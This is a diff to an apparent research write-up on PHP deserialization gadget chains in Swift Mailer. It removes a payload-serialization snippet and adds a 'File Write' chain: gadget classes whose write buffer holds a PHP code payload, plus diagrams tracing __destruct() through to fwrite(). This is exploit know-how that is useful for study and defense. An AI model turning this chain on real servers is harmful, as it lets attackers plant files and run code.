@@ -18,10 +18,6 @@
             $this->path = $path;
         }
     }
-
-    $path = "/var/www/html/file.txt";
-    $obj  = new Swift_ByteStream_TemporaryFileByteStream($path);
-    $payload = serialize($obj);
     ```
 
 - Abstract views: 
@@ -171,4 +167,72 @@
 
         A1D -- (3) --> B["'any' . fread('/path/to/file')"]
         A2E -- (3) --> B
+    ```
+
+### 3. File Write
+
+- Gadgets:
+
+    ```php
+    class Swift_ByteStream_FileByteStream extends Swift_ByteStream_AbstractFilterableInputStream{}
+
+    class Swift_Events_SimpleEventDispatcher{}
+    
+    class Swift_Transport_SendmailTransport {
+        public $buffer;
+        public $started;
+        public $eventDispatcher;
+    }
+
+    abstract class Swift_ByteStream_AbstractFilterableInputStream {
+        private $filters = [];
+        private $writeBuffer = '<?php phpinfo();?>//';
+    }
+    ```
+
+- Abstract views:
+
+    ```mermaid
+    classDiagram
+    class Swift_Transport_SendmailTransport{
+        +$buffer
+        +$started: true
+        +$eventDispatcher
+        +__destruct(): this->stop()
+        +stop()
+        +executeCommand(): this->buffer->write($command)
+    }
+
+    class Swift_ByteStream_FileByteStream{
+        -$path: "path/to/file"
+        -$mode
+        +write()
+        +doWrite()
+    }
+
+    class Swift_Events_SimpleEventDispatcher{
+        +createTransportChangeEvent()
+        +dispatchEvent()
+    }
+    
+    class Swift_ByteStream_AbstractFilterableInputStream{
+        $filters
+        $writeBuffer: "payload_write_to_path"
+    }
+
+    Swift_Transport_SendmailTransport --|> Swift_Events_SimpleEventDispatcher: $eventDispatcher
+    Swift_Transport_SendmailTransport --|> Swift_ByteStream_FileByteStream: $buffer
+    Swift_ByteStream_FileByteStream --|> Swift_ByteStream_AbstractFilterableInputStream: $writeBuffer
+    
+    ```
+
+- Flow when trigger POP chain by triggering `Swift_Transport_SendmailTransport->__destruct()`
+
+    ```mermaid
+    flowchart TD
+        A["Swift_Transport_SendmailTransport.__destruct()"] -- (1) --> B["Swift_Transport_SendmailTransport.stop()"]
+        B -- (2) --> C["Swift_Transport_SendmailTransport.executeCommand()"]
+        C -- (3) --> D["Swift_ByteStream_FileByteStream.write()"]
+        D -- (4) --> E["Swift_ByteStream_FileByteStream.doWrite()"]
+        E -- (5) --> F["fwrite(Swift_ByteStream_FileByteStream.getWriteHandle, Swift_ByteStream_FileByteStream.writeBuffer)"]
     ```
